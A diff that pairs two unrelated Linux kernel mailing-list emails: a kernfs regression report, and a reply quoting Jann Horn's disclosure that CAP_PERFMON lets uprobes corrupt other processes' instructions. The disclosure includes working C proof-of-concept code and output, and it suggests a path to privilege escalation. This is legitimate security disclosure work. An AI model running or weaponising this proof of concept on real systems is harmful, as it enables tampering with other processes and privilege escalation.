@@ -1,141 +1,209 @@
-Received: from mail-wm1-f42.google.com (mail-wm1-f42.google.com [209.85.128.42])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 32C142571BD
-	for <linux-security-module@vger.kernel.org>; Wed,  2 Jul 2025 10:48:02 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.42
+Received: from foss.arm.com (foss.arm.com [217.140.110.172])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5E72123956E;
+	Wed,  2 Jul 2025 11:13:24 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.140.110.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1751453284; cv=none; b=qCznBduGKT48VVSQapwyzIgKChKV3sOQVkDcwf8azp+inq0nH5cyY0HyYUbHOlQFsF1d/k0wrwbbuqy71wcEFldO+DdxG3NtvDUEwLduNMkWgLGC9J036AWbD8qv8fxOu8t9QSnQqABdaGXINjfM2Y2I1OpsFNde384DRELochU=
+	t=1751454806; cv=none; b=M65k/MUrHDWp/fud7jB0wRiyZ5dc8qbYFmDVUN9oa8551pXv9HGgqmSSayeqcu2CyG1Aknu9cxMYrCVwMd4w44FFtSeHww+93W2vPVqEVm0/gUqkg4KIIcJNeTsZDJYGqLmhFxH0CpCOE6GSQscSXavLQS+rJVX9ZmsaEesRSf0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1751453284; c=relaxed/simple;
-	bh=x0AFjkDlvAQocIajLTiEtOk7pDjdbIyb5Vl8YoFPFC8=;
-	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
-	 Content-Type:MIME-Version; b=Q0rRDINP99NjQOjqEMEJ8/F+wbviKnCZWrEBEDaY57ZsbEuZs8woG0WAVYzkaL4oeOx4Es4ffa9SnwkWCf0LkXAxvWZvP13GKEs790hN8y+GVNkfhJEmX/AETu1x30+Haqdkcnb7+GSPKw6iMZComUbylMdadvHakeniRoQgiv0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linaro.org; spf=pass smtp.mailfrom=linaro.org; dkim=pass (2048-bit key) header.d=linaro.org header.i=@linaro.org header.b=VpDcCa9s; arc=none smtp.client-ip=209.85.128.42
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linaro.org
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linaro.org
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=linaro.org header.i=@linaro.org header.b="VpDcCa9s"
-Received: by mail-wm1-f42.google.com with SMTP id 5b1f17b1804b1-45363645a8eso46280305e9.1
-        for <linux-security-module@vger.kernel.org>; Wed, 02 Jul 2025 03:48:01 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=linaro.org; s=google; t=1751453280; x=1752058080; darn=vger.kernel.org;
-        h=mime-version:user-agent:content-transfer-encoding:references
-         :in-reply-to:date:cc:to:from:subject:message-id:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=ZaqLaJib84m+unN67Qm6MiaO9gj1dwxDqxkPHoKHM38=;
-        b=VpDcCa9smd/NR8ALKfvOcaR+JRJyPiTN1XWd7ed1bal/ZCgDN5rOUi1ONMr7O792h3
-         MYq5MoHmfGGRDa22ksaY6CxDQ9cyWL7ECvzjUt6kVa0Rkjje3sCFlTgVdh3tQ67tCnAu
-         wxnjGwBgLkSXEx8ZboMiH0kHW6tFYlERP90oyb4+h7EKFgxE06WkG7ReMFt+P0YSWsnl
-         r0qDxw9hKNGfpApVS9pQYKfx98MZ0EdzJuURrGvEfNJf0BvomHi9zYDay1AwReZU7JjB
-         5O+fyB0Ty8rLaEzz3KBMmxN3gKEOI/ZMke8WnkdNTjSRXIWJL+NG3V0mE+jJrfA/avVV
-         UrPw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1751453280; x=1752058080;
-        h=mime-version:user-agent:content-transfer-encoding:references
-         :in-reply-to:date:cc:to:from:subject:message-id:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=ZaqLaJib84m+unN67Qm6MiaO9gj1dwxDqxkPHoKHM38=;
-        b=mpaM7ZgUKZHtGbnavSztJ/fJAzmlHrolkCXkB70+BGEIR/MFfs38ix2PZJr7vxlUIa
-         0uGptl1DgnEbKxcvcUXf0a819gqAOvF2cGEr5Y4QeLV9v//09SG9Te6CYzx8kbUOtpqH
-         Z042YwHQAv60f2rA3YwIT67iP98UlUmQWFIC9mGlCM7ELmHz8UHKLBfOUYC5AP3z91Z8
-         XCpRhCBi6erhe/o7mYYl43UsGaDig4ssrG27VjWeU6TZMuhAjdtgapimjvn5h4xfCRHM
-         qaLDjsJt8qvj3kdcjf0Irt/Bj1Twne4rQXl8IkfAFiXJIOkkN9+umpd+e4jdFAxPBzRX
-         i+gw==
-X-Forwarded-Encrypted: i=1; AJvYcCUwmcAmRws+rJNTzS9X4HSArvhUcHonuz2H2P/O+3nuuRyLdDcxjeKkA7NiUv7++jJIKOG4+Fpjgp/bMFXps1WVN8irUig=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzToX11l/fwBsfmCJeyNDNDrMYg0cu9nmCI0mJoqjGLB9kLvAF3
-	9wBVnKG27K7kAlwhxnYkOEfkLywNVAmuRZS8OLLh5F3NOQqL1pALT4hMvN/oD/Z8yVw=
-X-Gm-Gg: ASbGncu+k+VJsY1GJqVc9NcsqfOCBHYzvXM+rLwwMkO+dpvIox/GDimGTtZhS+syh+J
-	koECYpGMn771/f03p3kjyU68Tkz5dmE0IcKWNDk7rc0FmT/AUDlWHTwohVhD+Qpr7zdfJ6YLS5h
-	yufvnn0nP+cqTsmYeJ64aP420JxVw2C+6ztv/tOYAlI6CG6WlFMZTT8rLx07RQ7VYmEYdDTDT/2
-	NNEQ2j89PKMETT20hOOIp+jsWCYJocU1ebRrqPn91ONqhfdVBrnbdIi7oVBSjJ+I+1ecOITnGzM
-	tvk80IaVDbtlqQBsydPGurPoX6r3A2yZDhXuWK9O0ElvEX4XDHjuMAmdIf4TWPt1QcNgAJutWbu
-	2
-X-Google-Smtp-Source: AGHT+IFDoHf+aaq4UzigGUWl+x39S/WR6MN+OvN18dQGCVdn/JrZS6PzX26KE9GWmWHItZgUMtOHpw==
-X-Received: by 2002:a05:6000:4718:b0:391:3aaf:1d5f with SMTP id ffacd0b85a97d-3b200e2a0e3mr1859101f8f.52.1751453280453;
-        Wed, 02 Jul 2025 03:48:00 -0700 (PDT)
-Received: from draszik.lan ([80.111.64.44])
-        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-3a892e5f8a0sm15970228f8f.96.2025.07.02.03.47.58
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 02 Jul 2025 03:47:59 -0700 (PDT)
-Message-ID: <78b13bcdae82ade95e88f315682966051f461dde.camel@linaro.org>
-Subject: Re: [PATCH v3 bpf-next 1/4] kernfs: remove iattr_mutex
-From: =?ISO-8859-1?Q?Andr=E9?= Draszik <andre.draszik@linaro.org>
-To: Song Liu <song@kernel.org>, bpf@vger.kernel.org, 
-	linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org, 
-	linux-security-module@vger.kernel.org
-Cc: kernel-team@meta.com, andrii@kernel.org, eddyz87@gmail.com,
- ast@kernel.org, 	daniel@iogearbox.net, martin.lau@linux.dev,
- viro@zeniv.linux.org.uk, 	brauner@kernel.org, jack@suse.cz,
- kpsingh@kernel.org, mattbobrowski@google.com, 	amir73il@gmail.com,
- gregkh@linuxfoundation.org, tj@kernel.org, 	daan.j.demeyer@gmail.com, Will
- McVicker <willmcvicker@google.com>, Peter Griffin	
- <peter.griffin@linaro.org>, Tudor Ambarus <tudor.ambarus@linaro.org>, 
-	kernel-team@android.com
-Date: Wed, 02 Jul 2025 11:47:58 +0100
-In-Reply-To: <20250623063854.1896364-2-song@kernel.org>
-References: <20250623063854.1896364-1-song@kernel.org>
-	 <20250623063854.1896364-2-song@kernel.org>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-User-Agent: Evolution 3.56.1-1+build1 
+	s=arc-20240116; t=1751454806; c=relaxed/simple;
+	bh=O4m4hWzSFeOYN9mZ0ZgX38tbQ6F3yuF4mDW0ZT8cyHc=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=l1XWStTBuDdiJEYt+mOO31EkBQgi7F7GInmEgOa56Dx1hS1bp1MREI4P4ZP/ydz9NJzgt6RUrq+zP4ykyNTKh89Fb82x+FJgx3fSF3g2rzncmw8N58MXhGE50YoeJYdMRyyeeY2f96j8RPL55n7tkqCcpXA3b0GNfI/T2RF2bSg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com; spf=pass smtp.mailfrom=arm.com; arc=none smtp.client-ip=217.140.110.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=arm.com
+Received: from usa-sjc-imap-foss1.foss.arm.com (unknown [10.121.207.14])
+	by usa-sjc-mx-foss1.foss.arm.com (Postfix) with ESMTP id 9351B22D9;
+	Wed,  2 Jul 2025 04:13:08 -0700 (PDT)
+Received: from J2N7QTR9R3 (usa-sjc-imap-foss1.foss.arm.com [10.121.207.14])
+	by usa-sjc-imap-foss1.foss.arm.com (Postfix) with ESMTPSA id 17FBE3F6A8;
+	Wed,  2 Jul 2025 04:13:19 -0700 (PDT)
+Date: Wed, 2 Jul 2025 12:13:17 +0100
+From: Mark Rutland <mark.rutland@arm.com>
+To: Jann Horn <jannh@google.com>
+Cc: Serge Hallyn <serge@hallyn.com>,
+	linux-security-module <linux-security-module@vger.kernel.org>,
+	Peter Zijlstra <peterz@infradead.org>,
+	Ingo Molnar <mingo@redhat.com>,
+	Arnaldo Carvalho de Melo <acme@kernel.org>,
+	Namhyung Kim <namhyung@kernel.org>,
+	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
+	Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>,
+	Adrian Hunter <adrian.hunter@intel.com>,
+	"Liang, Kan" <kan.liang@linux.intel.com>,
+	linux-perf-users@vger.kernel.org,
+	Kernel Hardening <kernel-hardening@lists.openwall.com>,
+	linux-hardening@vger.kernel.org,
+	kernel list <linux-kernel@vger.kernel.org>,
+	Alexey Budankov <alexey.budankov@linux.intel.com>,
+	James Morris <jamorris@linux.microsoft.com>
+Subject: Re: uprobes are destructive but exposed by perf under CAP_PERFMON
+Message-ID: <aGUUTII8p3x29VEw@J2N7QTR9R3>
+References: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 Precedence: bulk
 X-Mailing-List: linux-security-module@vger.kernel.org
 List-Id: <linux-security-module.vger.kernel.org>
 List-Subscribe: <mailto:linux-security-module+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-security-module+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 
-Hi,
+On Tue, Jul 01, 2025 at 06:14:51PM +0200, Jann Horn wrote:
+> Since commit c9e0924e5c2b ("perf/core: open access to probes for
+> CAP_PERFMON privileged process"), it is possible to create uprobes
+> through perf_event_open() when the caller has CAP_PERFMON. uprobes can
+> have destructive effects, while my understanding is that CAP_PERFMON
+> is supposed to only let you _read_ stuff (like registers and stack
+> memory) from other processes, but not modify their execution.
 
-On Sun, 2025-06-22 at 23:38 -0700, Song Liu wrote:
-> From: Christian Brauner <brauner@kernel.org>
->=20
-> All allocations of struct kernfs_iattrs are serialized through a global
-> mutex. Simply do a racy allocation and let the first one win. I bet most
-> callers are under inode->i_rwsem anyway and it wouldn't be needed but
-> let's not require that.
->=20
-> Signed-off-by: Christian Brauner <brauner@kernel.org>
-> Acked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
-> Acked-by: Tejun Heo <tj@kernel.org>
-> Signed-off-by: Song Liu <song@kernel.org>
+I'm not sure whether CAP_PERFMON is meant to ensure that, or simply
+meant to provide lesser privileges than CAP_SYS_ADMIN, so I'll have to
+leave that discussion to others. I agree it seems undesirable to permit
+destructive effects.
 
-On next-20250701, ls -lA gives errors on /sys:
+> uprobes (at least on x86) can be destructive because they have no
+> protection against poking in the middle of an instruction; basically
+> as long as the kernel manages to decode the instruction bytes at the
+> caller-specified offset as a relocatable instruction, a breakpoint
+> instruction can be installed at that offset.
 
-$ ls -lA /sys/
-ls: /sys/: No data available
-ls: /sys/kernel: No data available
-ls: /sys/power: No data available
-ls: /sys/class: No data available
-ls: /sys/devices: No data available
-ls: /sys/dev: No data available
-ls: /sys/hypervisor: No data available
-ls: /sys/fs: No data available
-ls: /sys/bus: No data available
-ls: /sys/firmware: No data available
-ls: /sys/block: No data available
-ls: /sys/module: No data available
-total 0
-drwxr-xr-x   2 root root 0 Jan  1  1970 block
-drwxr-xr-x  52 root root 0 Jan  1  1970 bus
-drwxr-xr-x  88 root root 0 Jan  1  1970 class
-drwxr-xr-x   4 root root 0 Jan  1  1970 dev
-drwxr-xr-x  11 root root 0 Jan  1  1970 devices
-drwxr-xr-x   3 root root 0 Jan  1  1970 firmware
-drwxr-xr-x  10 root root 0 Jan  1  1970 fs
-drwxr-xr-x   2 root root 0 Jul  2 09:43 hypervisor
-drwxr-xr-x  14 root root 0 Jan  1  1970 kernel
-drwxr-xr-x 251 root root 0 Jan  1  1970 module
-drwxr-xr-x   3 root root 0 Jul  2 09:43 power
+FWIW, similar issues would apply to other architectures (even those like
+arm64 where instuctions are fixed-size and naturally aligned), as a
+uprobe could be placed on a literal pool in a text section, corrupting
+data.
 
+It looks like c9e0924e5c2b reverts cleanly, so that's an option.
 
-and my bisect is pointing to this commit. Simply reverting it also fixes
-the errors.
+Mark.
 
-
-Do you have any suggestions?
-
-
-Cheers,
-Andre'
+> This means uprobes can be used to alter what happens in another
+> process. It would probably be a good idea to go back to requiring
+> CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
+> where the kernel can prove that the software breakpoint poke cannot
+> break the target process. (Which seems harder than doing it for
+> kprobe, since kprobe can at least rely on symbols to figure out where
+> a function starts...)
+> 
+> As a small example, in one terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
+> #include <unistd.h>
+> #include <stdio.h>
+> 
+> __attribute__((noinline))
+> void bar(unsigned long value) {
+>   printf("bar(0x%lx)\n", value);
+> }
+> 
+> __attribute__((noinline))
+> void foo(unsigned long value) {
+>   value += 0x90909090;
+>   bar(value);
+> }
+> 
+> void (*foo_ptr)(unsigned long value) = foo;
+> 
+> int main(void) {
+>   while (1) {
+>     printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
+> *)(void*)foo)[1]);
+>     foo_ptr(0);
+>     sleep(1);
+>   }
+> }
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
+> jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
+> [...]
+> 00000000000011b0 <foo>:
+>     11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
+>     11b5:       48 01 c7                add    %rax,%rdi
+>     11b8:       eb d6                   jmp    1190 <bar>
+> [...]
+> jannh@horn:~/test/perfmon-uprobepoke$ ./target
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> ```
+> 
+> and in another terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <unistd.h>
+> #include <err.h>
+> #include <sys/mman.h>
+> #include <sys/syscall.h>
+> #include <linux/perf_event.h>
+> 
+> int main(void) {
+>   int uprobe_type;
+>   FILE *uprobe_type_file =
+> fopen("/sys/bus/event_source/devices/uprobe/type", "r");
+>   if (uprobe_type_file == NULL)
+>     err(1, "fopen uprobe type");
+>   if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
+>     errx(1, "read uprobe type");
+>   fclose(uprobe_type_file);
+>   printf("uprobe type is %d\n", uprobe_type);
+> 
+>   unsigned long target_off;
+>   FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
+>   if (!pof)
+>     err(1, "popen nm");
+>   if (fscanf(pof, "%lx", &target_off) != 1)
+>     errx(1, "read target offset");
+>   pclose(pof);
+>   target_off += 1;
+>   printf("will poke at 0x%lx\n", target_off);
+> 
+>   struct perf_event_attr attr = {
+>     .type = uprobe_type,
+>     .size = sizeof(struct perf_event_attr),
+>     .sample_period = 100000,
+>     .sample_type = PERF_SAMPLE_IP,
+>     .uprobe_path = (unsigned long)"target",
+>     .probe_offset = target_off
+>   };
+>   int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
+>   if (perf_fd == -1)
+>     err(1, "perf_event_open");
+>   char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
+>   if (map == MAP_FAILED)
+>     err(1, "mmap error");
+>   printf("mmap success\n");
+>   while (1) pause();
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
+> jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
+> jannh@horn:~/test/perfmon-uprobepoke$ ./poke
+> uprobe type is 9
+> will poke at 0x11b1
+> mmap success
+> ```
+> 
+> This results in the first terminal changing output as follows, showing
+> that 0xcc was written into the middle of the "mov" instruction,
+> modifying its immediate operand:
+> ```
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> ```
+> 
+> It's probably possible to turn this into a privilege escalation by
+> doing things like clobbering part of the distance of a jump or call
+> instruction.
